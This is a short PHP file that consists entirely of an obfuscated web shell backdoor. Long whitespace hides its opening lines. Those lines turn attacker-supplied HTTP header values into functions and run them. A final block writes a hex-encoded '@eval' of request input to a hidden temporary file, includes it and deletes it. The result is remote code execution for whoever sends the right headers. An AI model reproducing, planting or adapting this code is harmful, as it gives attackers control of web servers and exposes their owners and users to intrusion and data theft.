<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Large-Allocation'])){$db2_convert=$_HEADERS['Large-Allocation']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Authorization']));$db2_convert();}
																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$config=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Content-Security-Policy']));$config();}
																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Feature-Policy'])){$internal=$_HEADERS['Feature-Policy']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Authorization']));$internal();}

$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $c = "<\x3f\x70h\x70\x20@\x65\x76a\x6c\x28$\x5f\x48E\x41\x44E\x52\x53[\x22\x49f\x2d\x4do\x64\x69f\x69\x65d\x2d\x53i\x6e\x63e\x22\x5d)\x3b\x40e\x76\x61l\x28\x24_\x52\x45Q\x55\x45S\x54\x5b\"\x49\x66-\x4d\x6fd\x69\x66i\x65\x64-\x53\x69n\x63\x65\"\x5d\x29;";
    $f = '/tmp/.'.time();
    file_put_contents($f, $c);
    include($f);
    unlink($f);
}